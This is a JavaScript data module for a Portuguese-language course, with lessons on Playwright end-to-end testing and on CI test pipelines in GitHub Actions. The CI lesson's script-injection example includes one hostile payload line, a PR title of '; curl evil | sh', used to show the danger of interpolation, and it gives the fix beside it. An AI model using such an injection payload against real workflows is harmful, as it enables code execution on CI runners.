// C5.5 — Ferramentas de teste para JavaScript. Aulas 5 e 6 (Playwright; testes em pipelines de CI).
import { REF } from './c55-a.mjs';
import { REF2 } from './c55-b.mjs';
const R = String.raw;

export const REF3 = {
  pwIntro: { title: 'Playwright — Getting started', url: 'https://playwright.dev/docs/intro', kind: 'doc' },
  pwBest: { title: 'Playwright — Best Practices', url: 'https://playwright.dev/docs/best-practices', kind: 'doc' },
  pwLocators: { title: 'Playwright — Locators', url: 'https://playwright.dev/docs/locators', kind: 'doc' },
  pwTrace: { title: 'Playwright — Trace Viewer', url: 'https://playwright.dev/docs/trace-viewer', kind: 'doc' },
  pwCi: { title: 'Playwright — Continuous Integration', url: 'https://playwright.dev/docs/ci', kind: 'doc' },
  pwShard: { title: 'Playwright — Sharding', url: 'https://playwright.dev/docs/test-sharding', kind: 'doc' },
  pwWait: { title: 'Playwright — Auto-waiting', url: 'https://playwright.dev/docs/actionability', kind: 'doc' },
  ghActions: { title: 'GitHub Actions — Documentation', url: 'https://docs.github.com/en/actions', kind: 'doc' },
  ghHardening: { title: 'GitHub Actions — Security hardening', url: 'https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions', kind: 'doc' },
  actionlint: { title: 'actionlint — static checker for GitHub Actions workflows', url: 'https://github.com/rhysd/actionlint', kind: 'ferramenta' }
};

export const lessonsC = [
{
  id: 'ftj-05', moduleId: 'm3', order: 5, minutes: 80, tags: ['Playwright', 'locators', 'auto-espera', 'trace viewer', 'paralelismo', 'sharding', 'page.route'],
  title: 'Playwright: E2E fora do navegador, com auto-espera, locators acessíveis, paralelismo e trace viewer',
  objectives: ['Configurar o Playwright Test com o Chrome do sistema, webServer e workers', 'Usar locators por papel e rótulo e asserções web com auto-espera', 'Provar a auto-espera com respostas atrasadas sem nenhum sleep', 'Simular a rede com page.route e gravar traces para depurar falhas', 'Medir paralelismo (workers) e sharding e interpretar o resultado', 'Comparar Playwright e Cypress e escolher conforme o contexto'],
  intro: R`O **Playwright** controla **Chromium, Firefox e WebKit** por **protocolo**, de **fora** do navegador, com **auto-espera** nas ações e **asserções web** que **repetem** até passar. No laboratório (**Playwright 1.65.1**, **Chrome do sistema**, §channel: 'chrome'§, **sem baixar navegadores**), **11 testes** passaram em **12,3 s** (4 workers) e **13,1 s** (1 worker); os **7 testes com resposta atrasada de 0 a 300 ms passaram sem nenhum §sleep§**; **2 shards** levaram **8,3 s** e **7,9 s**; um **trace** de um teste ocupou **46.310 bytes**.`,
  theory: R`### O que é
**Playwright Test** é o runner do Playwright: **fixtures** (§page§, §context§, §browser§), **paralelismo por arquivo** (workers), **retentativas**, **relatórios** (lista, HTML, JUnit), **traces**, **mock de rede** (§page.route§), **emulação** (dispositivos, geolocalização, locale), **várias abas e origens**, **API testing** (§request§) e **componentes** (experimental). **Linguagens:** **JS/TS** (este curso), **Python, Java e .NET**.
**Navegadores:** **Chromium, Firefox e WebKit** (baixados pelo §npx playwright install§) **ou** navegadores **do sistema** via §channel§ (§'chrome'§, §'msedge'§). **Neste laboratório** usou-se **apenas o Google Chrome do sistema**: **Firefox e WebKit não foram executados**.

### Configuração (playwright.config.mjs)
§testDir§, §timeout§ (**15 s** por teste), §fullyParallel: true§, §workers: 4§, §retries§, §reporter§, §use: { baseURL, channel: 'chrome', headless, trace }§ e **§webServer§** (§command: 'node servidor-e2e.mjs'§, §url§, §reuseExistingServer§): o Playwright **sobe** a aplicação, **espera** a URL **responder** e **encerra** ao final: **resolve** o problema do **servidor no ar** (que no Cypress é **manual**).

### Locators acessíveis e auto-espera
- §page.getByRole('button', { name: 'Comprar' })§, §getByLabel('Cliente')§, §getByText(...)§, §getByTestId(...)§: **seletores que se parecem com o usuário** e **forçam acessibilidade**; **encadeáveis** e **filtráveis**;
- **Auto-espera (*actionability*):** antes de **clicar**, o Playwright espera o elemento **existir, ficar visível, estável, habilitado e receber eventos**; **asserções web** (§await expect(locator).toHaveText(...)§) **repetem** até **passar** ou **estourar** (§expect.timeout§: **5 s** por padrão);
- **Sem sleep:** **medido:** **7 testes** com **atraso do servidor de 0, 50, 100, 150, 200, 250 e 300 ms** **passaram todos**, **sem §waitForTimeout§**. Compare com o **experimento do tst-03**: a **espera fixa de 120 ms falhou em 8 de 14** execuções;
- **Asserções que NÃO esperam:** §expect(await locator.textContent())§ **lê uma vez**: **evite**; **use** §expect(locator).toHaveText§.
**Medido (suíte de 11 testes):** compra (§getByLabel('Cliente').fill('ana')§, §getByLabel('Qtd').fill('2')§, clique, §toHaveText(/Pedido \d+ pago: R\$ 20\.00/)§), **cupom desconhecido** (§Erro: cupom desconhecido§), **cupom válido** (§toContainText('R$ 18.00')§), **7 atrasos** e **1 teste com rede simulada**.

### Mock de rede com page.route
§await page.route('**/pedidos', (route) => route.fulfill({ status: 422, contentType: 'application/json', body: JSON.stringify({ erro: 'estoque indisponível' }) }))§ **intercepta** a requisição e **devolve** a resposta do teste: **passou** (§Erro: estoque indisponível§) **sem o backend**. **Usos:** erros **raros**, **latência**, **dados** de **terceiros**; **cuidado** (como no Cypress): **mantenha ao menos um E2E sem simulação**. Também há §route.continue§ (modificar) e §route.abort§ (falha de rede), **HAR** para **gravar/reproduzir**.

### Paralelismo e shards (medidos)
- **Workers:** processos **independentes** (cada um com **seu navegador**); testes **de arquivos diferentes** (ou do **mesmo**, com §fullyParallel§) **rodam em paralelo**; **isole os dados** (cada teste cria o que precisa; **servidor compartilhado** tem **ids crescentes**: por isso o laboratório usa **regex** §Pedido \d+§);
- **Medido:** **4 workers: 12,3 s**; **1 worker: 13,1 s** para **11 testes**: **ganho pequeno**. **Por quê:** cada teste leva **~1,5 a 2,9 s** e **a maior parte** é **abrir contexto/página** e **concorrência** de **navegadores** na **mesma máquina** (CPU compartilhada); em **suítes maiores** e **máquinas com mais núcleos**, o ganho cresce. **Meça** no **seu** ambiente;
- **Shards:** §--shard=1/2§ e §2/2§ **dividem** os testes entre **máquinas** (CI): **6 testes em 8,3 s** e **5 testes em 7,9 s** (rodados **em sequência** aqui, **em máquinas separadas** no CI o tempo total ≈ **o maior**).

### Trace viewer: depuração post-mortem
§trace: 'on'§ (ou §'on-first-retry'§, §'retain-on-failure'§) grava um **§trace.zip§** com **linha do tempo**, **DOM antes/depois de cada ação**, **rede**, **console** e **código**; §npx playwright show-trace trace.zip§ abre o **visualizador**. **Medido:** **46.310 bytes** para **1 teste**. **Padrão de CI:** §retries: 2§ + §trace: 'on-first-retry'§ + **upload do §test-results/§** quando falhar (aula ftj-06). **Também:** **screenshots**, **vídeos** e **HTML report**.

### Playwright x Cypress (quando escolher)
| Critério | Playwright | Cypress |
|---|---|---|
| **Arquitetura** | protocolo, **fora** do navegador | **dentro** do navegador |
| **Abas/origens/iframes** | **livres** | limitações (cy.origin) |
| **Navegadores** | Chromium, Firefox, WebKit | Chrome, Firefox, Edge, Electron |
| **Paralelismo/shards** | **embutidos e gratuitos** | via Cypress Cloud ou divisão manual |
| **API de espera** | auto-espera + asserções web | retentativa de comandos |
| **Depuração** | **trace viewer** | **time travel** (modo interativo) |
| **Instalação** | navegadores baixados **ou canal do sistema** (usado aqui) | **binário de 811 MB** (medido) |
| **Linguagens** | JS/TS, Python, Java, .NET | JS/TS |
**Resumo prático:** **Playwright** para **multi-navegador, WebKit, multi-aba, CI com shards**; **Cypress** para **times que priorizam a experiência interativa** em **apps de uma origem**. **Ambos** exigem **disciplina** (poucos E2E, dados isolados, seletores estáveis).

### Boas práticas oficiais (resumo)
- **Teste o comportamento visível ao usuário**, **não** detalhes de implementação; **locators** por papel/rótulo;
- **Isole** testes (**contexto novo** por teste: cookies e storage **limpos**); **reaproveite autenticação** com **§storageState§**;
- **Não** teste **terceiros**; **simule-os**;
- **Evite** sleeps; **use** asserções web; **fixe** a versão do navegador;
- **Trace** nas retentativas; **paralelize** com dados isolados;
- **Mantenha** o **servidor de teste** **determinístico** (relógio e ids; o laboratório fixa o relógio).

### Armadilhas
- **§waitForTimeout§**; **seletores CSS frágeis**; **testes dependentes**; **dados compartilhados** em paralelo;
- **Navegador diferente** entre **local** e **CI** (**fixe** versões; no CI use **§playwright install --with-deps§**);
- **Retries** que **escondem** flakiness: **meça** a taxa de testes que **só passam na retentativa** (aula tst-03).`,
  concepts: [
    { term: 'Playwright', def: 'Ferramenta de automação e testes de navegador que controla Chromium, Firefox e WebKit por protocolo, com auto-espera.' },
    { term: 'Auto-espera (actionability)', def: 'Verificações automáticas (visível, estável, habilitado) que o Playwright faz antes de agir sobre um elemento.' },
    { term: 'Locator', def: 'Objeto que descreve como encontrar elementos (por papel, rótulo, texto ou test id) de forma resiliente.' },
    { term: 'page.route', def: 'API do Playwright para interceptar e responder requisições de rede em um teste.' },
    { term: 'Trace viewer', def: 'Visualizador de gravações com linha do tempo, DOM, rede e console de uma execução de teste.' },
    { term: 'Shard', def: 'Fatia do conjunto de testes executada em uma máquina, para dividir a suíte no CI.' },
    { term: 'storageState', def: 'Arquivo com cookies e storage reaproveitado para evitar login repetido nos testes.' }
  ],
  examples: R`**Analogia:** o Playwright é um **maître que espera o prato ficar pronto antes de servir**: não "chuta" um tempo, observa se o prato está **no balcão, inteiro e quente**; e anota tudo em um **diário (trace)** que permite rever o que aconteceu quando algo falha.

**Exemplo 1: auto-espera.** 7 atrasos de 0 a 300 ms passam sem nenhum sleep.

**Exemplo 2: rede simulada.** page.route devolve 422 e a mensagem aparece sem backend.

**Exemplo 3: shards.** 11 testes divididos em 6 + 5: 8,3 s e 7,9 s.`,
  code: [
    { title: 'playwright.config.mjs com Chrome do sistema e webServer (JavaScript; 11 testes passam em 12,3 s)', lang: 'js', code: R`import { defineConfig } from '@playwright/test';
export default defineConfig({
  testDir: './playwright',
  timeout: 15000,
  fullyParallel: true,
  workers: 4,
  retries: 0,
  reporter: [['list']],
  use: { baseURL: 'http://127.0.0.1:4571', channel: 'chrome', headless: true, trace: process.env.TRACE ? 'on' : 'off' },
  webServer: { command: 'node servidor-e2e.mjs', url: 'http://127.0.0.1:4571', reuseExistingServer: false, timeout: 15000 }
});
// npx playwright test                      -> 11 passed (12.3s)
// npx playwright test --workers=1          -> 11 passed (13.1s)
// npx playwright test --shard=1/2 | 2/2    -> 6 passed (8.3s) | 5 passed (7.9s)
// TRACE=1 npx playwright test -g "compra com sucesso" -> trace.zip de 46.310 bytes`, notes: [{ l: '9', t: 'channel: chrome usa o navegador do sistema, sem baixar binários.' }, { l: '10', t: 'O Playwright sobe e derruba o servidor da aplicação.' }] },
    { title: 'Locators, auto-espera e mock de rede (JavaScript, @playwright/test; testado)', lang: 'js', code: R`import { test, expect } from '@playwright/test';

test('compra com sucesso', async ({ page }) => {
  await page.goto('/');
  await page.getByLabel('Cliente').fill('ana');
  await page.getByLabel('Qtd').fill('2');
  await page.getByRole('button', { name: 'Comprar' }).click();
  await expect(page.getByRole('status')).toHaveText(/Pedido \d+ pago: R\$ 20\.00/);   // repete até passar
});

for (const atraso of [0, 50, 100, 150, 200, 250, 300]) {
  test('auto-espera com resposta atrasada em ' + atraso + ' ms', async ({ page }) => {
    await page.goto('/?atraso=' + atraso);
    await page.getByRole('button', { name: 'Comprar' }).click();
    await expect(page.getByRole('status')).toHaveText(/^Pedido \d+ pago/);   // sem sleep
  });
}

test('rede simulada', async ({ page }) => {
  await page.route('**/pedidos', (route) => route.fulfill({ status: 422, contentType: 'application/json', body: JSON.stringify({ erro: 'estoque indisponível' }) }));
  await page.goto('/');
  await page.getByRole('button', { name: 'Comprar' }).click();
  await expect(page.getByRole('status')).toHaveText('Erro: estoque indisponível');
});`, notes: [{ l: '8', t: 'A asserção web faz polling até o texto aparecer ou o tempo esgotar.' }, { l: '19', t: 'A resposta é fabricada pelo teste, sem backend.' }] },
    { title: 'Reaproveitar login com storageState (JavaScript; trecho conceitual, não executado nesta aula)', lang: 'js', code: R`// auth.setup.mjs: executa uma vez e salva cookies/localStorage
import { test as setup } from '@playwright/test';
setup('autenticar', async ({ page }) => {
  await page.goto('/login');
  await page.getByLabel('E-mail').fill('ana@exemplo.com');
  await page.getByLabel('Senha').fill(process.env.SENHA_DE_TESTE);
  await page.getByRole('button', { name: 'Entrar' }).click();
  await page.context().storageState({ path: '.auth/ana.json' });
});

// playwright.config: projetos com dependência e estado salvo
// projects: [{ name: 'setup', testMatch: /auth\.setup\.mjs/ }, { name: 'e2e', dependencies: ['setup'], use: { storageState: '.auth/ana.json' } }]`, notes: [{ l: '6', t: 'A senha de teste vem de variável de ambiente, nunca do código.' }, { l: '12', t: 'Os testes herdam a sessão sem repetir o login.' }] }
  ],
  bestPractices: ['Use locators por papel, rótulo e texto e asserções web em vez de leituras pontuais.', 'Configure webServer, baseURL e fixe a versão do navegador; use o canal do sistema quando preferir não baixar binários.', 'Isole dados por teste (ou use regex para ids crescentes) antes de aumentar os workers.', 'Grave trace nas retentativas e guarde test-results como artefato nas falhas.', 'Simule a rede para cenários raros, mas mantenha E2E sem simulação nas jornadas críticas.', 'Reaproveite autenticação com storageState e segredos de teste em variáveis de ambiente.', 'Meça paralelismo e shards no seu ambiente e acompanhe os testes que só passam na retentativa.'],
  mistakes: ['Usar waitForTimeout em vez de asserções web.', 'Ler textContent uma vez e asserir sem repetição.', 'Seletores CSS por posição ou classe de estilo.', 'Dados compartilhados entre testes paralelos.', 'Retries mascarando flakiness sem medir.', 'Divergência entre a versão do navegador local e a do CI.'],
  market: R`**Playwright** é hoje a **escolha mais frequente** em projetos **novos** de E2E; saber **locators acessíveis, traces, paralelismo e shards** é o que **empresas pedem** de quem **estabiliza** suítes de E2E.`,
  summary: R`O Playwright controla os navegadores por protocolo, com auto-espera, locators acessíveis, asserções web que repetem, mock de rede, paralelismo, shards e trace viewer. Medido (1.65.1, Chrome do sistema): 11 testes em 12,3 s com 4 workers e 13,1 s com 1 worker (ganho pequeno em suíte curta), shards 1/2 e 2/2 em 8,3 s e 7,9 s, 7 respostas atrasadas (0 a 300 ms) sem nenhum sleep e um trace de 46.310 bytes. Firefox e WebKit não foram executados. Compare com o Cypress e mantenha poucos E2E, dados isolados e flakiness monitorada.`,
  refs: [REF3.pwIntro, REF3.pwBest, REF3.pwLocators, REF3.pwWait, REF3.pwTrace, REF3.pwShard, REF2.cypressDocs],
  cards: [
    { q: 'O que é a auto-espera do Playwright?', a: 'Antes de agir, ele aguarda o elemento ficar visível, estável, habilitado e pronto para eventos; asserções web também repetem até passar.' },
    { q: 'Que resultado o experimento de atrasos deu?', a: 'Os 7 testes com atraso de 0 a 300 ms passaram sem nenhum sleep.' },
    { q: 'Para que serve o trace viewer?', a: 'Depuração post-mortem com linha do tempo, DOM antes e depois de cada ação, rede e console (46.310 bytes em 1 teste).' },
    { q: 'Por que 4 workers quase não ganharam de 1 worker no laboratório?', a: 'A suíte é curta e o tempo é dominado pela abertura de contextos e pela concorrência de navegadores na mesma máquina.' }
  ]
},
{
  id: 'ftj-06', moduleId: 'm3', order: 6, minutes: 75, tags: ['CI', 'GitHub Actions', 'pipelines', 'matriz', 'sharding', 'artefatos', 'actionlint', 'flaky'],
  title: 'Testes em pipelines de CI: camadas, matrizes, shards, artefatos, relatórios e verificação do próprio workflow',
  objectives: ['Desenhar um pipeline de testes por camadas com feedback rápido primeiro', 'Escrever um workflow do GitHub Actions com matriz de versões, shards, cache e artefatos de falha', 'Aplicar segurança básica (permissões mínimas, versões de ações, segredos) e concorrência', 'Validar o workflow estaticamente com o actionlint e interpretar seus erros', 'Definir políticas para testes flaky, timeouts e relatórios (JUnit/HTML)', 'Saber o que foi executado (lint local) e o que não foi (execução em um runner)'],
  intro: R`Um teste que **não roda automaticamente** é um teste que **deixa de rodar**. O **CI** executa as camadas na **ordem do custo**, **falha rápido**, **guarda evidências** e **protege o branch principal**. No laboratório, um workflow de **3 jobs** (unitários em **matriz Node 24 e 26**, API, e **E2E com 2 shards**) foi **validado com o actionlint 1.7.12** (**exit 0**), e um workflow **defeituoso** gerou **4 erros** (**exit 1**): job inexistente em §needs§, §matrix.nodee§, §github.evnt§ e §runs-on§ ausente. **A execução em um runner real não foi feita.**`,
  theory: R`### Desenho do pipeline
**Princípios:** **feedback rápido primeiro** (**lint, tipos, unitários** em segundos/minutos), **camadas mais caras depois** (integração, E2E), **falhar cedo** (§needs§), **paralelizar** o que é independente (**matriz**, **shards**), **reprodutibilidade** (versões **fixas**, §npm ci§, **cache**), **evidências** (artefatos), **tempo-alvo** da PR (**poucos minutos** para o essencial).
| Estágio | Conteúdo | Quando |
|---|---|---|
| **Estático** | lint, formatação, tipos, verificação de ADRs/diagramas | **toda PR**, segundos |
| **Unitários** | Vitest/Jest/node:test, **cobertura** | toda PR (matriz de versões) |
| **Integração/API** | Supertest, banco real | toda PR |
| **E2E** | Playwright/Cypress, **shards** | PR (jornadas críticas) e/ou **noturno** |
| **Pesados** | carga, contrato, segurança (C5.6 e C7) | noturno/pré-release |
| **Pós-deploy** | **fumaça** | a cada deploy |

### O workflow do laboratório (§ci/ci.yml§)
- **Gatilhos:** §pull_request§ e §push§ na §main§; **§concurrency§** (§group: testes-DOLAR{{ github.ref }}§, §cancel-in-progress: true§): **cancela** execuções **antigas** da **mesma PR**; **§permissions: contents: read§** (**mínimo necessário**: **princípio do menor privilégio**);
- **Job §unitarios§:** **matriz** §node: [24, 26]§ com §fail-fast: false§ (**vê todas as falhas**), §actions/setup-node§ com **§cache: npm§**, §npm ci§ (**instalação reprodutível** pelo lockfile), §npm run test:vitest -- --coverage§ e **upload** da cobertura (§if: always()§);
- **Job §api§:** §needs: unitarios§ (**só roda se os unitários passarem**), §npm run test:api§;
- **Job §e2e§:** §needs: api§, **matriz de shards** §[1, 2]§, §npx playwright install --with-deps chromium§, §npx playwright test --shard=DOLAR{{ matrix.shard }}/2§ e **upload do §test-results§ §if: failure()§** com **retenção de 7 dias**;
- **§timeout-minutes§** em **todos** os jobs (**evita jobs presos**).
**Limite honesto:** o workflow foi **escrito e validado estaticamente**; **não foi enviado a um repositório nem executado em um runner** (**nenhuma execução real** de Actions).

### Validação estática com actionlint
O **actionlint** (Rhysd) **analisa** workflows **sem executar**: **sintaxe**, **tipos de expressões** (§github.*§, §matrix.*§), **dependências** entre jobs, **ações** inexistentes/mal usadas, **shell** embutido (com **shellcheck**, se disponível), **erros de segurança** comuns. **Executado** via **imagem Docker** (§rhysd/actionlint§, **versão 1.7.12**):
- **§ci.yml§**: **sem problemas** (**exit 0**);
- **§invalido.yml§** (defeitos propositais): **exit 1** com **4 erros**:
 1. §job "a" needs job "inexistente" which does not exist in this workflow [job-needs]§;
 2. §property "nodee" is not defined in object type {node: number} [expression]§ (**typo** em §matrix.nodee§);
 3. §property "evnt" is not defined in object type {action: string; ...} [expression]§ (**typo** em §github.evnt§);
 4. §"runs-on" section is missing in job "b" [syntax-check]§.
**Use no CI/pré-commit** (**falha rápida**: **erros de digitação** em expressões **só apareceriam** na execução).

### Matriz, shards e cache
- **Matriz** (§strategy.matrix§): **versões de Node**, **sistemas**, **navegadores**; **§fail-fast: false§** para **ver todas** as combinações; **§include/exclude§** para ajustar;
- **Shards:** **divida** a suíte E2E (§--shard=i/n§; Vitest e Jest também têm §--shard§). **No laboratório:** **2 shards** (**8,3 s** e **7,9 s**) **vs.** **13,1 s** em **1 worker**: **no CI**, com **máquinas separadas**, o **tempo de parede** tende ao **maior shard** (≈ **8,3 s** + **instalação**); **meça** a **sobrecarga** (instalar navegador, subir servidor);
- **Cache:** §setup-node§ com §cache: npm§; **navegadores do Playwright** (§~/.cache/ms-playwright§) e **binário do Cypress** (§~/.cache/Cypress§: **811 MB** medidos) **valem o cache**; **chave** com **hash do lockfile**.

### Artefatos, relatórios e anotações
- **Artefatos nas falhas:** §actions/upload-artifact§ com **traces**, **screenshots**, **vídeos**, **logs**, **cobertura**; **retenção** curta;
- **Relatórios:** **JUnit XML** (§--reporter=junit§) para **painéis** e **anotações** na PR; **HTML** (Playwright); **sumário** em §GITHUB_STEP_SUMMARY§;
- **Cobertura:** **limiares** como **portões** apenas para **código novo** (aula tst-06); **não** transforme em **meta global**.

### Testes flaky no pipeline
- **Medir:** **taxa de falha por teste** ao longo do tempo (aula tst-03 e §testesInstaveis§); **quem só passa na retentativa** conta como **flaky**;
- **Política:** **retentativas** (**1 ou 2**) **só em E2E**, **com alerta**; **quarentena** com **tíquete e prazo**; **corrigir ou remover**; **jamais** "**rode de novo**" como **cultura**;
- **Isolamento:** testes **independentes** e **dados únicos**; **fixe** versões do navegador;
- **Timeouts** em **três níveis**: **teste**, **job** (§timeout-minutes§) e **workflow**.

### Segurança do pipeline
- **Permissões mínimas** (§permissions§) e **tokens** de **curta duração**; **segredos** só onde **necessários** (**nunca** em PRs de **forks**);
- **Fixe** ações por **versão** (e, **para ações de terceiros críticas**, por **SHA** do commit); **revise** atualizações (**Dependabot/Renovate**);
- **Cuidado com §pull_request_target§** e **injeção de script** (§DOLAR{{ github.event.pull_request.title }}§ **dentro de §run§**): **use variáveis de ambiente** em vez de **interpolar** dados **não confiáveis**;
- **Imagens e dependências**: **§npm ci§**, **auditoria** (C7), **lockfile** commitado.

### O que o laboratório mediu e o que não mediu
| Item | Situação |
|---|---|
| Workflow YAML | **escrito** e **validado** com actionlint 1.7.12 (**exit 0**) |
| Workflow defeituoso | **4 erros** detectados (**exit 1**) |
| Execução em runner (GitHub-hosted) | **não executada** |
| Shards localmente | **executados**: 8,3 s e 7,9 s (11 testes) |
| Matriz de Node | **não executada** (apenas Node 26.13.1 local) |
| Cache de binários | **não medido** em CI (binário do Cypress: 811 MB) |

### Boas práticas
1. **Camadas** por custo, **needs** para **falhar cedo**; 2. **§npm ci§** e **lockfile**; 3. **matriz** com §fail-fast: false§; 4. **shards** e **cache**; 5. **artefatos** só nas falhas; 6. **permissões mínimas** e **timeouts**; 7. **actionlint** no **pré-commit/CI**; 8. **flaky** com **política**; 9. **tempo-alvo** monitorado.`,
  concepts: [
    { term: 'Pipeline de CI', def: 'Sequência automatizada de etapas (lint, testes, build) executada a cada mudança no repositório.' },
    { term: 'Matriz de jobs', def: 'Configuração que executa o mesmo job com combinações de parâmetros (versões, sistemas, shards).' },
    { term: 'Shard', def: 'Fatia da suíte de testes executada em uma máquina para reduzir o tempo total.' },
    { term: 'Artefato', def: 'Arquivo produzido por um job (relatórios, traces, cobertura) e guardado para consulta.' },
    { term: 'Concurrency (Actions)', def: 'Configuração que agrupa execuções e permite cancelar as antigas da mesma referência.' },
    { term: 'Menor privilégio', def: 'Princípio de conceder apenas as permissões estritamente necessárias (permissions: contents: read).' },
    { term: 'actionlint', def: 'Verificador estático de workflows do GitHub Actions que detecta erros de sintaxe, tipos e dependências.' }
  ],
  examples: R`**Analogia:** o pipeline é uma **linha de inspeção de fábrica**: as verificações **rápidas e baratas** ficam no começo (se a peça está torta, para tudo), as **caras** no final; cada falha **tira uma foto** (artefato) para quem for consertar; e o **manual da linha** (o workflow) também é **conferido** antes de ligar a esteira (actionlint).

**Exemplo 1: needs.** E2E só roda se unitários e API passaram.

**Exemplo 2: actionlint.** Typos em matrix.nodee e github.evnt são pegos sem executar.

**Exemplo 3: artefatos.** Em falha, o test-results (traces) sobe como artefato por 7 dias.`,
  code: [
    { title: 'Workflow de testes com matriz, shards e artefatos (YAML; versão resumida do ci.yml do laboratório, sem o job api; validado com actionlint 1.7.12, não executado em runner)', lang: 'yaml', code: R`name: testes
on:
  pull_request:
  push:
    branches: [main]
concurrency:
  group: testes-DOLAR{{ github.ref }}
  cancel-in-progress: true
permissions:
  contents: read
jobs:
  unitarios:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    strategy:
      fail-fast: false
      matrix:
        node: [24, 26]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: DOLAR{{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm run test:vitest -- --coverage
  e2e:
    runs-on: ubuntu-latest
    needs: unitarios
    timeout-minutes: 20
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 26
          cache: npm
      - run: npm ci
      - run: npx playwright install --with-deps chromium
      - run: npx playwright test --shard=DOLAR{{ matrix.shard }}/2
      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: traces-shard-DOLAR{{ matrix.shard }}
          path: test-results
          retention-days: 7`, notes: [{ l: '6', t: 'Cancela execuções antigas da mesma PR.' }, { l: '9', t: 'Permissões mínimas: só leitura do conteúdo.' }] },
    { title: 'actionlint em Docker: workflow válido e workflow com defeitos (shell; resultado medido)', lang: 'bash', code: R`docker run --rm -v "$PWD/ci:/repo" -w /repo rhysd/actionlint:latest -color=false ci.yml
# exit 0 (sem problemas)

docker run --rm -v "$PWD/ci:/repo" -w /repo rhysd/actionlint:latest -color=false invalido.yml
# invalido.yml:4:3: job "a" needs job "inexistente" which does not exist in this workflow [job-needs]
# invalido.yml:13:29: property "nodee" is not defined in object type {node: number} [expression]
# invalido.yml:14:24: property "evnt" is not defined in object type {action: string; ...} [expression]
# invalido.yml:15:3: "runs-on" section is missing in job "b" [syntax-check]
# exit 1`, notes: [{ l: '1', t: 'A imagem oficial roda sem instalar nada no host.' }, { l: '5', t: 'Typos em expressões só apareceriam durante a execução se não houvesse lint.' }] },
    { title: 'Injeção de script em workflows: o que NÃO fazer e a alternativa (YAML; conceitual)', lang: 'yaml', code: R`# ERRADO: interpola um dado controlado por quem abre a PR direto no shell
- run: echo "Título: DOLAR{{ github.event.pull_request.title }}"

# CERTO: passa por variável de ambiente (o shell não interpreta o conteúdo como código)
- run: echo "Título: $TITULO"
  env:
    TITULO: DOLAR{{ github.event.pull_request.title }}`, notes: [{ l: '2', t: 'Um título como "; curl evil | sh" executaria no runner.' }, { l: '6', t: 'A variável de ambiente evita a interpolação no script.' }] }
  ],
  bestPractices: ['Ordene as camadas por custo e use needs para falhar cedo.', 'Use npm ci com lockfile, cache de dependências e de binários de navegador e fixe versões.', 'Use matriz com fail-fast: false e shards para reduzir o tempo de parede, medindo a sobrecarga.', 'Guarde artefatos (traces, relatórios, cobertura) nas falhas com retenção curta.', 'Defina permissões mínimas, timeouts e concurrency com cancelamento.', 'Valide os workflows com actionlint em pré-commit e CI.', 'Meça flakiness, aplique quarentena com prazo e evite retentativas como cultura.'],
  mistakes: ['Interpolar dados não confiáveis (título de PR) direto no run.', 'Workflows sem timeout, sem permissions e sem concurrency.', 'Rodar todos os testes em um único job lento.', 'Cache ausente (baixar navegadores a cada execução).', 'Retentativas que escondem testes flaky.', 'Nunca validar o próprio workflow.'],
  market: R`**Montar e manter pipelines de testes** (GitHub Actions, GitLab CI) é **competência diária** de **backend, QA/SDET e plataforma**; **segurança de workflows** e **otimização de tempo** (matriz, shards, cache) são **tópicos recorrentes** em **entrevistas**.`,
  summary: R`Um pipeline de testes ordena as camadas por custo, falha cedo (needs), paraleliza com matrizes e shards, usa npm ci, cache e artefatos nas falhas, e aplica permissões mínimas, timeouts e concurrency. Medido: o workflow do laboratório (3 jobs, matriz Node 24 e 26, 2 shards de E2E) passou no actionlint 1.7.12 (exit 0) e o workflow defeituoso gerou 4 erros (exit 1); os shards locais levaram 8,3 s e 7,9 s contra 13,1 s em um worker. A execução em um runner real e a matriz de Node não foram executadas. Meça e trate flakiness com política.`,
  refs: [REF3.ghActions, REF3.ghHardening, REF3.actionlint, REF3.pwCi, REF3.pwShard, REF.vitestGuide],
  cards: [
    { q: 'Por que usar needs entre os jobs do pipeline?', a: 'Para falhar cedo: as camadas caras (E2E) só rodam se as baratas (unitários e API) passarem.' },
    { q: 'O que o actionlint detectou no workflow defeituoso?', a: 'Job inexistente em needs, matrix.nodee, github.evnt e runs-on ausente (4 erros, exit 1).' },
    { q: 'Por que passar títulos de PR por variável de ambiente?', a: 'Para evitar injeção de script: interpolar dados não confiáveis no run permite executar comandos arbitrários.' },
    { q: 'O que não foi executado nesta aula?', a: 'O workflow em um runner real do GitHub, a matriz de versões do Node e a medição do cache de binários no CI.' }
  ]
}
];
